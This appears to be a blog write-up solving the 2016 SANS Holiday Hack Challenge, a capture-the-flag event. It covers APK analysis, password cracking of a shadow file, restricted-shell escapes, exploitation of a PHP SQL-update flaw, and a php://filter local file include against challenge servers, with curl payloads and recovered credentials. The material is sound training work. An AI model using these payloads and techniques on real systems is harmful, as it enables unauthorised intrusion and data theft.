## Introduction
Every year, the folks at [Counter Hack Challenges](https://www.counterhackchallenges.com/) run a cyber security challenge for people to enjoy over the festive season, and this year it's a corker.

Head over to [the challenge site](https://holidayhackchallenge.com/2016/) to set the scene, have a look at the questions, and have a go for yourself before reading my solution below!

## Part 1&#58; A Most Curious Business Card

First, we examine Santa's business card to see if it contains any clues which might help us get started on our adventure. We see a Twitter handle of [@santawclaus](//twitter.com/santawclaus) and a similar Instagram handle of [santawclaus](//instagram.com/santawclaus).

[![center business card](/images/business_card.png)](/images/business_card.png)

A glance at the Twitter stream at first seems like Santa has been spouting gobbledygook, but perhaps there is a hidden message? We use the following python script to pull all the tweets for further analysis.

{% highlight python %}
from HTMLParser import HTMLParser
from twitter import *

access_key = "ACCESS_KEY_HERE"
access_secret = "ACCESS_SECRET_HERE"
consumer_key = "CONSUMER_KEY_HERE"
consumer_secret = "CONSUMER_SECRET_HERE"

twitter = Twitter(auth = OAuth(access_key,
                               access_secret,
                               consumer_key,
                               consumer_secret))

user = "santawclaus"
statuses = []
max_id = 798175529463676928
html_parser = HTMLParser()

while True:
    results = twitter.statuses.user_timeline(screen_name = user,
                                             count = 200,
                                             max_id = max_id)

    if len(results) == 0:
       break

    statuses += [html_parser.unescape(x['text']) for x in results]

    max_id = min([x['id'] for x in results]) - 1


for status in statuses:
    print status
{% endhighlight %}

and the hidden message of `BUG BOUNTY` becomes plain as day:

For the moment, we have no idea what this hidden message might mean, so let's put that to one side for now and have a look at the Instagram account.

The santawclaus Instagram account was host to three images, only one of which appears to contain information; the one of the messy desk.

![center messy desk](/images/messy_desk.jpg)

Close inspection reveals a couple of interesting artefacts; the first is the obscured nmap scan report for the domain `www.northpolewonderland.com` and the other is the end of what looks like a PowerShell command on the laptop screen which seems to suggest the creation of a file with filename `SantaGram_v4.2.zip`.

First of all, we consult [Tom Hessman](https://twitter.com/tkh16) in the quest world to make sure that `www.northpolewonderland.com` `(130.211.124.143)` is in scope, and he warns us that whilst this machine is part of the challenge, it should only be used for acquiring static content hosted on the webserver there, not attacked in any way.

This hints to us that as we come across filenames, it's probably worth seeing if they are hosted on this site. If we apply this logic and attempt to fetch `http://www.northpolewonderland.com/SantaGram_v4.2.zip`, it seems we have correctly guessed a static asset deserving of our attention.

Attempting to extract the ZIP file reveals to us that password protection has been employed, but this is where Santa's hidden message comes into play; the password for the archive is `bugbounty`. Inside, is `SantaGram_4.2.apk` - the social media Android application that so many of the elves in the quest world were talking about.

## Part 2&#58; Awesome Package Konveyance

Now that we have our Android application package file, `SantaGram_4.2.apk`, it's time for us to dive in and see what we can discover, using a mixture of dynamic analysis and forensic work, and using the hints given to us by the folk in the quest world to guide us.

First, we load the APK into an Android emulator to see how it behaves when it is running. I chose to use Genymotion, since it was recommended in the excellent SANS blog post, [Ghost in the Droid: Reverse Engineering Android Apps](https://pen-testing.sans.org/blog/2016/12/05/ghost-in-the-droid-reverse-engineering-android-apps) by [Ed Skoudis](https://twitter.com/edskoudis).

By proxying the emulated OS's network traffic through [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project), and trusting ZAP's CA certificate in the emulated OS, we can observe the app's HTTP(S) activity. We see communication with a few endpoints as we put the app's functionality through it's paces:
 - `ads.northpolewonderland.com (104.198.221.240)`
 - `analytics.northpolewonderland.com (104.198.252.157)`
 - `ex.northpolewonderland.com (104.154.196.33)`

We will come back and analyse these individually later, but for now we can answer the question of what credentials are embedded in the APK from this dynamic analysis - a sample payload from a request to the analytics site reveals the credentials we were probably looking for:

{% highlight json %}
{  
   "username": "guest",
   "password": "busyreindeer78",
   "type":     "usage",
   "activity": "SplashScreen",
   "udid":     "ae26ee9299bb87f0"
}
{% endhighlight %}

We will probably have to take a different approach to our analysis in order to acquire the hidden audio that we're looking for, as it seems unlikely this is going to travel across the wire. Let's follow the excellent advice of another SANS blog post, [Mining Android Secrets (Decoding Android App Resources)](https://pen-testing.sans.org/blog/2016/12/10/mining-android-secrets-decoding-android-app-resources), once again by Ed Skoudis.

We pass our Android application through `apktool` in order to extract the resources contained therein. Since we know we're looking for an audio file, we could guess that we're looking for a file with extension `.mp3` and use `find -iname '*.mp3'` to try and find it, which turns up `res/raw/discombobulatedaudio1.mp3` (MD5 hash `b7aca2f218c39b997bfd61b83856aed2`).

By also examining the `res/values/strings.xml` resource, we see the following further endpoints referenced which will be important for part 4 of the challenge:
 - `dev.northpolewonderland.com (35.184.63.245)`
 - `dungeon.northpolewonderland.com (35.184.47.139)`

## Part 3&#58; A Fresh-Baked Holiday Pi

Back in the story world, we've been hard at work tracking down the parts of the Cranberry Pi. Upon acquiring the Cranberry Pi board from the hidden fireplace room, the HDMI cable from the reindeer stables (moo!), the power cord from beside the snowman, the heatsink from the loft area, and the SD card from the end of the walkway in the clouds, it is now time to revisit Holly Evergreen. She provides us with the final piece of the Cranberry Pi puzzle; a [link to the firmware image, Cranbian](http://www.northpolewonderland.com/cranbian.img.zip), that runs on the pi board. She tells us that we need to recover the password for the `cranpi` user account in order to be able to use the pi board in the story world.

Having downloaded and extracted the `cranbian.img` file, we follow the advice of another convenient blog post, [Mount a Raspberry Pi File System Image](https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image), again by Ed Skoudis.

Once we have the image mounted, we can grab the shadow file from `/etc/shadow` and use the hints provided to us by Minty Candycan in the story world by pointing John The Ripper at it using the RockYou wordlist. In no time at all, the password cracking software has recovered the `cranpi` user's password; `yummycookies`.

Upon telling Holly Evergreen the password to the `cranpi` user account, we now find ourselves with the ability to interact with the various terminals that are dotted throughout the story world.

### Terminal - Elf House #2
This terminal greets us with the following banner

    *******************************************************************************
    *                                                                             *
    *To open the door, find both parts of the passphrase inside the /out.pcap file* 
    *                                                                             *
    *******************************************************************************

Examining the permissions of the `/out.pcap` file shows us that it is owned by user `itchy` and only they have permissions to read the file, but unfortunately our primary prompt string indicates that our shell is running the context of user `scratchy`.

Let's see if we have any `sudo` permissions:

    scratchy@2bb2b19b8c63:~$ sudo -l
    <Matching Defaults entries for scratchy on 1fae5a6f6ac5:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    User scratchy may run the following commands on 1fae5a6f6ac5:
        (itchy) NOPASSWD: /usr/sbin/tcpdump
        (itchy) NOPASSWD: /usr/bin/strings

It would seem that we are able to run the `tcpdump` and `strings` commands as `itchy` without having to know our own password, how convenient. Let's first pass the packet capture file through strings to see if there are any interesting plaintext tokens:

    scratchy@2bb2b19b8c63:~$ sudo -u itchy strings -20 /out.pcap
    BGET /firsthalf.html HTTP/1.1
    User-Agent: Wget/1.17.1 (darwin15.2.0)

    1403, 1056298300, 1207374239]}

We can see the output from a HTTP request to `http://192.168.188.130/firsthalf.html` which, in the response body, includes a hidden HTML field called `part1` and with value `santasli`.

We could have a crack at the second half, which appears to be contained within the binary response body of a similar request to `/secondhalf.bin`, which would almost certainly require some `tcpdump`-fu, or we could take a (correct!) guess that the password to the door accompanying the terminal is `santaslittlehelper`.

### Terminal - Workshop (near reindeer)
This temrinal greets us with the following banner

    *******************************************************************************
    *                                                                             *
    * Find the passphrase from the wumpus.  Play fair or cheat; it's up to you.   * 
    *                                                                             *
    *******************************************************************************

We are running under the context of user `elf` and have a single file in our home directory, `wumpus`, which is an executable. For this challenge, I started out by just playing the game - it's fairly simple to beat after all, and killed the Wumpus. I'm sorry Wumpus. `WUMPUS IS MISUNDERSTOOD`.

Later, I performed a more detailed analysis of the executable by encoding it as base64 out to the terminal, copying that to an isolated x86_64 Debian VM, and reverse engineering it using GDB.

We find that there are several command line options which can be supplied to the executable:

 - `-a`: specify number of arrows the player starts with
 - `-b`: specify number of bats present in the cave
 - `-h`: hard mode, which tightens constraints on starting positions and room/tunnel/bat/pit ratios and "last chances"
 - `-p`: specify number of pits present in the cave
 - `-r`: specify number of rooms in the cave
 - `-t`: specify number of tunnels in the cave

Some of these parameters have constraints applied to them, for example the number of rooms has to be greater than 5.

Using these parameters, we can cheat and make the game trivial to complete, for example by making a cave with 6 rooms and 5 tunnels, in which case we just shoot into every room from our starting room until we inevitably hit the poor Wumpus.

### Terminal - Train
With this terminal, we are dropped into the "Train Management Console". Using `HELP` drops us into a `less` session, presenting instructions on how to operate the train, along with a Cranberry pie recipe. As the instructions hint at, being in `less` gives us the ability to execute commands using `!`. Using `!ls` we can see the working directory contains three files: `ActivateTrain`, `TrainHelper.txt` and `Train_Console`.

`TrainHelper.txt` is presumably the file we're reading, `Train_Console` is the "Train Management Console" we were dropped into in the first place, and `ActivateTrain` is an executable which triggers the ability to travel back in time. We can therefore call the `ActivateTrain` executable from the `HELP` context using `!./ActivateTrain` or we can also use `strings` on the console script to discover the passphrase of `24fb3e89ce2aa0ea422c3d511d40dd84` which can be used to `START` the train via the management console legitimately, once the brakes have been released with `BRAKEOFF`.

### Terminal - Workshop (near staircase)
This terminal greets us with the following banner

    *******************************************************************************
    *                                                                             *
    * To open the door, find the passphrase file deep in the directories.         * 
    *                                                                             *
    *******************************************************************************

Here, we use the `find` command to list the files and directories under the home folder recursively:

    elf@019f15a853ea:~/.doormat$ find
    .
    ./. 
    ./. / 
    ./. / /\
    ./. / /\/\\
    ./. / /\/\\/Don't Look Here!
    ./. / /\/\\/Don't Look Here!/You are persistent, aren't you?
    ./. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'
    ./. / /\/\\/Don't Look Here!/You are persistent, aren't you?/'/key_for_the_door.txt
    ./. / /\/\\/Don't Look Here!/You are persistent, aren't you?/cookbook
    ./. / /\/\\/Don't Look Here!/You are persistent, aren't you?/temp
    ./. / /\/\\/Don't Look Here!/secret
    ./. / /\/\\/Don't Look Here!/files
    ./. / /\/\\/holiday
    ./. / /\/\\/temp
    ./. / /\/santa
    ./. / /\/ls
    ./. / /opt
    ./. / /var
    ./. /bin
    ./. /not_here
    ./share
    ./temp

We can see the file which we are probably interested in - `key_for_the_door.txt` - so we use `find` once again combined with the `-exec` flag to read its contents, without having to worry about traversing the awkwardly named directories ourselves:

    elf@019f15a853ea:~/.doormat$ find -name 'key_for_the_door.txt' -exec cat {} \;
    key: open_sesame

### Terminal - Santa's Office

This terminal drops us into another interactive script rather than a shell, and we are greet with the following famous line

    GREETINGS PROFESSOR FALKEN.

This challenge requires that we answer the prompts as was done in the 1983 movie `War Games`, as follows:

    GREETINGS PROFESSOR FALKEN.
    
    Hello.
    
    
    HOW ARE YOU FEELING TODAY?

### Conclusion of Part 3
Between these terminals, we are granted access to all but one door in the quest world. By using the terminal in the workshop, beside the reindeer stables, allows us into the DFER (or Dungeon For Errant Reindeer), which is empty in the present day, but contains the captive Santa Claus if we travel back to 1978 using the train terminal.

## Part 4&#58; My Gosh... It's Full of Holes

In this part, we exploit the following targets as referenced in the SantaGram android application, and as per Tom Hessman's confirmation that they are in-scope.

### The Mobile Analytics Server #1
This server appears to be an endpoint for collecting and querying analytics data. Retrieval of the first MP3 file on this site is trivial; we log into the web application using the credentials we recovered in part 2 (`guest:busyreindeer78`) and are presented with a menu item at the top labeled "MP3". Clicking this downloads `discombobulatedaudio2.mp3` (MD5 hash `f05c1ec6c536e455ec686973fa6b8e20`).

### The Mobile Analytics Server #2
Using `nmap` to scan the analytics server, with the standard set of scripts enabled (thanks to Holly Evergreen from the quest world for the tip) yields the revelation that the source code for the web application is hosted on the server in the form of a bare git repositry at `/.git/`. Recursively download this bare repository and checking it out allows us the peruse the source code for the web application in its current state, as well as viewing the history of the development of the application.

From the history, we can see that the `SQL` for generating the database schema and static data for the site had in it at some point a set of credentials for the `administrator` user (introduced in commit `85a4207c178fa0f9c6b6bb77a6d42eac487159c0` and removed in commit `85a4207c178fa0f9c6b6bb77a6d42eac487159c0`):

    INSERT INTO `users` VALUES (0,'administrator','KeepWatchingTheSkies'),(1,'guest','busyllama67');

Trying these credentials in the web application reveals that this password has not been rotated since it was commited and removed from source control, and allows us to access more of the web application's functionality, most intrestingly the "experiemental" ability to modify saved queries against the data.

By querying the data, making sure to save it which returns us the key (a GUID) for the query, and using the edit functionality, we are able to modify the SQL statement for that question due to the way the `edit.php` code searches `GET` query parameters exhaustively for those matching the columns from the schema in the database (whilst the UI only allows editing of the query name and description. The vulnerable code is shown below:

{% highlight php %}
    # Update the row with the new values
    $set = [];
    foreach($row as $name => $value) {
      print "Checking for " . htmlentities($name) . "...<br>";
      if(isset($_GET[$name])) {
        print 'Yup!<br>';
        $set[] = "`$name`='" . mysqli_real_escape_string($db, $_GET[$name]) . "'";
      }
    }

    $query = "UPDATE `reports` " .
      "SET " . join($set, ', ') . ' ' .
      "WHERE `id`='" . mysqli_real_escape_string($db, $_REQUEST['id']) . "'";
    print htmlentities($query);

    $result = mysqli_query($db, $query);
{% endhighlight %}

Thus by examining the schema, specifically the `audio` table which holds the MP3 metadata and blobs, we are able to modify a saved query with SQL constructed such that it will divulge the contents of the table in an HTML-friendly format (base64 encoding the MP3 blob using MySQL's handy `TO_BASE64` builtin function):

    SELECT id,username,filename,TO_BASE64(mp3) FROM audio;

which gives us

| `id`                                   | `username`      | `filename`                  | `mp3`     |
| :------------------------------------- | :-------------- | :-------------------------- | :-------- | 
| `20c216bc-b8b1-11e6-89e1-42010af00008` | `guest`         | `discombobulatedaudio2.mp3` | _omitted_ |
| `3746d987-b8b1-11e6-89e1-42010af00008` | `administrator` | `discombobulatedaudio7.mp3` | _omitted_ |

We can then take the base64 encoding of the `discombobulatedaudio7.mp3` file (MD5 hash `313e7e370fd7d5232bb569f21856d9f4`) and recover the audio file for later analysis.

### The Dungeon Game
Whilst conducting our adventure is the quest world, we are told by various NPCs about a game called "Dungeon" which is played by Pepper Mintstix, who provides us with a link (http://www.northpolewonderland.com/dungeon.zip) to an old copy of the game. Downloading and extract this yields an ELF 64-bit executable called `dungeon` as well as what turns out to be an encrypted assets file called `dtextc.dat`.

Executing the `dungeon` file in an isolated VM indeed drops us into a game of [dungeon, otherwise known as Zork](https://en.wikipedia.com/wiki/Zork), one of the earliest interactive fiction computer games.

Playing the game through to completion seems like it could waste a considerable amount of time, so let's consider alternative approaches to beating it.

My first port of call was to download and compile [a tool](http://web.mit.edu/jhawk/src/cdungeon-decode.c) for decrypting the resources file. Perusing the resources file shows that even if we are able to beat the local copy of the game by getting to the room containing the elf and presenting him with an item, he will tell us that we have complete the online version - presumably located somewhere on `dungeon.northpolewonderland.com`.

Portscanning this host shows an unusual open port listening on TCP/11111, and surely enough by connecting to this socket with `netcat` we see what looks like a hosted, interactive service running a copy of `dungeon`.

Since we will be unable to access the hosted `dtextc.dat` file in which our desired information presumably lies, we will have to figure out how to complete the game only by interacting with it. Fortunately, research turns up a hidden interactive debugger built into some versions of the game called GDT, which is indeed present in the downloaded and hosted version, which we are able to use to cheat and reach the completion scenario with easy. We therefore connect to the hosted game and use the correct incantations to get the information we need, shown below:
    
    $ nc 35.184.47.139 11111            
    Welcome to Dungeon.                     This version created 11-MAR-78.
    You are in an open field west of a big white house with a boarded
    front door.
    There is a small wrapped mailbox here.

    >look
    You have mysteriously reached the North Pole.
    In the distance you detect the busy sounds of Santa's elves in full
    production.
    
    You are in a warm room, lit by both the fireplace but also the glow of
    centuries old trophies.
    On the wall is a sign:
                    Songs of the seasons are in many parts
                    To solve a puzzle is in our hearts
                    Ask not what what the answer be,
                    Without a trinket to satisfy me.
    The elf is facing you keeping his back warmed by the fire.
    >inventory
    You are carrying:
      A jewel-encrusted egg.
    >give elf egg
    The elf, satisified with the trade says -
    send email to "peppermint@northpolewonderland.com" for that which you seek.
    The elf says - you have conquered this challenge - the game will now end.
    Your score is 5 [total of 585 points], in 5 moves.
    This gives you the rank of Beginner.

Following the instructions and sending an e-mail to `peppermint@northpolewonderland.com` we receive a prompt reply with the `discombobulatedaudio3.mp3` file (MD5 hash `0be15d00299af1a6bc1d11ab6f2696a0`) attached.

### The Debug Server
From examining the SantaGram Android application string resources, we see from the following lines that the debug server endpoint is located at `dev.northpolewonderland.com` and, more interestingly that debug data collection is disabled by default, which would explain why we didn't see any traffic to this endpoint whilst exercise the app as-is.

{% highlight xml %}
    <string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
    <string name="debug_data_enabled">false</string>
{% endhighlight %}

By changing this value to `true`, re-assembling the Android application and signing it with our own key, we are able to load the modified version of the application into our emulator. Grepping the `smali` for the string `debug` suggests that the debug-reporting behaviour should be triggered by visiting the `EditProfile` activity. Doing so causes the following HTTP request to be made (JSON formatting mine throughout):

    POST /index.php HTTP/1.1
    Content-Type: application/json
    User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.4; Samsung Galaxy S4 - 4.4.4 - API 19 - 1080x1920 Build/KTU84P)
    Host: dev.northpolewonderland.com
    Connection: Keep-Alive
    Accept-Encoding: gzip
    Content-Length: 155
    
    {
        "date": "20161218140911-0500",
        "freemem": -1,
        "debug": "com.northpolewonderland.santagram.EditProfile, EditProfile",
        "udid": "91104f4f660a1469"
    }

with response as follows:

    HTTP/1.1 200 OK
    Server: nginx/1.6.2
    Date: Mon, 19 Dec 2016 00:36:01 GMT
    Content-Type: application/json
    Connection: keep-alive
    Content-Length: 244

    {
        "date": "20161219003601",
        "status": "OK",
        "filename": "debug-20161219003601-0.txt",
        "request": {
            "date": "20161218140911-0500",
            "freemem": -1,
            "debug": "com.northpolewonderland.santagram.EditProfile, EditProfile",
            "udid": "91104f4f660a1469",
            "verbose": false
        }
    }


We see that the request payload is reflected back to us in the response, but includes an extra parameter that we did not specify named `verbose`, by crafting our own request to include this parameter with its value set to `true`, the server responds with a list of the reports that it has (which appear to be cleared out periodically, judging by the way the list changes over time):

    POST /index.php HTTP/1.1

        },
        "files": [
            "debug-20161219002320-0.txt",

            "debug-20161219003601-0.txt",
            "debug-20161219003617-0.txt",
            "debug-20161219003621-0.txt",
            "debug-20161224235959-0.mp3",
            "index.php"
        ]
    }

Notice `debug-20161224235959-0.mp3` - this must be another discombobulated audio file! Surely enough, we can download this simply by making a `GET` request to `http://dev.northpolewonderland.com/debug-20161224235959-0.mp3` (MD5 hash `0a5ef5d7a0e89658a833d1892a9e1ec6`).

### The Banner Ad Server
This endpoint, `http://ads.northpolewonderland.com`, is used to serve up advertisements within the SantaGram Android application. Visiting the site in a browser (with our ad-blocker disabled, as it seems to interfere with the site) reveals a web application built using the [Meteor framework](https://www.meteor.com/).

Using the information available on Ed Skoudis's SANS blog post, [Mining Meteor](https://pen-testing.sans.org/blog/2016/12/06/mining-meteor), we can use the [TamperMonkey](https://tampermonkey.net/) script [MeteorMiner](https://github.com/nidem/MeteorMiner) to inspect the routes available in the web application. Navigating to the `/admin/quotes` route, we notice a subscription to the `adminQuotes` publication, which contains amongst it's collections an entry with a property called `audio` and value `/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3`. Fetching this resource from `http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3` gives us another audio file (MD5 hash `3d87c1d31717f81f1966db4133f9e24d`).

### The Uncaught Exception Handler Server
Looking at the request (truncated for brevity) and response which is sent/received by the Android application reports an unhandled exception, we see the following:

    POST http://ex.northpolewonderland.com/exception.php HTTP/1.1
    Content-Type: application/json
    User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; ONE A2003 Build/MMB29M)
    Connection: Keep-Alive
    Content-Length: 1269
    Host: ex.northpolewonderland.com

    {
        "operation": "WriteCrashDump",
        "data": {
            "message": "Invalid index 0, size is 0",
            ...
        }
    }
 
    HTTP/1.1 200 OK
    Server: nginx/1.10.2
    Date: Thu, 15 Dec 2016 15:33:09 GMT
    Content-Type: text/html; charset=UTF-8
    Connection: keep-alive
    
    {
    	"success" : true,
    	"folder" : "docs",
    	"crashdump" : "crashdump-Ez9xc2.php"
    }

From here, we can fuzz the request payload and examine the server's response to try and built a mental model of the functionality supported by this endpoint:

    $ curl http://ex.northpolewonderland.com/exception.php \
        -d '{}'
    Content type must be: application/json
    
    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{}'
    Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.
    
    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{"operation":"ReadCrashDump"}'
    Fatal error! JSON key 'data' must be set.
    
    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{"operation":"ReadCrashDump", "data": {}}'
    Fatal error! JSON key 'crashdump' must be set.
    
    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{"operation":"ReadCrashDump", "data": {"crashdump":"crashdump-Ez9xc2.php"}}'
    Fatal error! crashdump value duplicate '.php' extension detected.
    
    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{"operation":"ReadCrashDump", "data": {"crashdump":"crashdump-Ez9xc2"}}'
    <<response body contains what we submitted in the dump data>>

At this point, we can start to think about what vulnerabilities might exist. As per the hints from Sugarplum Mary in the quest world, we could think about PHP I/O streams as a potential vector, and using another SANS blog post, [Getting MOAR Value out of PHP Local File Include Vulnerabilities](https://pen-testing.sans.org/blog/2016/12/07/getting-moar-value-out-of-php-local-file-include-vulnerabilities) by Ed Skoudis, we can use the `ReadCrashDump` functionality to read the source for `exception.php` (with the exception being automatically added by the code on the remote end) by passing a PHP stream filter as the `crashdump` argument:

    $ curl http://ex.northpolewonderland.com/exception.php \
        -H 'Content-Type: application/json' \
        -d '{"operation":"ReadCrashDump", "data": {"crashdump":"php://filter/convert.base64-encode/resource=exception"}}'

Base64 decoding the output from this gives us the source for the webpage:

At the top of the source, we see a handy code comment which reveals the location of the audio file, `http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3` which we can download using a standard `GET` request (MD5 sum `4ee86b5b0eef9f8815ee7446272a6c06`).

### Summary
In total, between the six exploits explored above and the APK embedded resources, we have seven audio files:

See part 5 for their analysis, and to find out who the perpetrator was!

## Part 5&#58; Discombobulated Audio

Now that we have all of the discombobulated audio files, it's time to figure out what they mean. From listening to some of the files, it sounds like there might be some slowed-down speech, so by speeding up the tracks with trial and error using [Audacity](http://www.audacityteam.org/), and putting them in order of their filenames (with the `debug-...0.mp3 slotting in between file 3 and 5), we end up with a coherent, and familiar, sentence:

    "Father Christmas, Santa Claus. Or, as I've always known him, Jeff."
                     ~ The Doctor
                       Doctor Who, A Christmas Carol (2010)

This turns out to be the passphrase for the final door (the one lacking a terminal) in "The Corridor" area of the quest world, and allows us access to The Clock Tower in both the present day and in 1978. Climbing the The Clock Tower the present day, we find none other than the Doctor himself, who admits to kidnapping Santa!

The Doctor explains his reasoning in his epilogue; he wished to take Santa back to 1978 and use his magick to prevent the release of the Star Wars Holiday Special.

    <Dr. Who> - The question of the hour is this: Who nabbed Santa.
    <Dr. Who> - The answer? Yes, I did.
    <Dr. Who> - Next question: Why would anyone in his right mind kidnap Santa Claus?
    <Dr. Who> - The answer: Do I look like I'm in my right mind? I'm a madman with a box.
    <Dr. Who> - I have looked into the time vortex and I have seen a universe in which the Star Wars Holiday Special was NEVER released. 
                In that universe, 1978 came and went as normal. No one had to endure the misery of watching that abominable blight. 
                People were happy there. It's a better life, I tell you, a better world than the scarred one we endure here.
    <Dr. Who> - Give me a world like that. Just once.
    <Dr. Who> - So I did what I had to do. 
                I knew that Santa's powerful North Pole Wonderland Magick could prevent the Star Wars Special from being released, 
                if I could leverage that magick with my own abilities back in 1978. 
                But Jeff refused to come with me, insisting on the mad idea that it is better to maintain the integrity of the universe’s timeline. 
                So I had no choice – I had to kidnap him.
    <Dr. Who> - It was sort of one of those days.
    <Dr. Who> - Well. You know what I mean.
    <Dr. Who> - Anyway... Since you interfered with my plan, we'll have to live with the Star Wars Holiday Special in this universe... FOREVER.
                If we attempt to go back again, to cross our own timeline, we'll cause a temporal paradox, a wound in time.
    <Dr. Who> - We'll never be rid of it now. The Star Wars Holiday Special will plague this world until time itself ends... 
                All because you foiled my brilliant plan
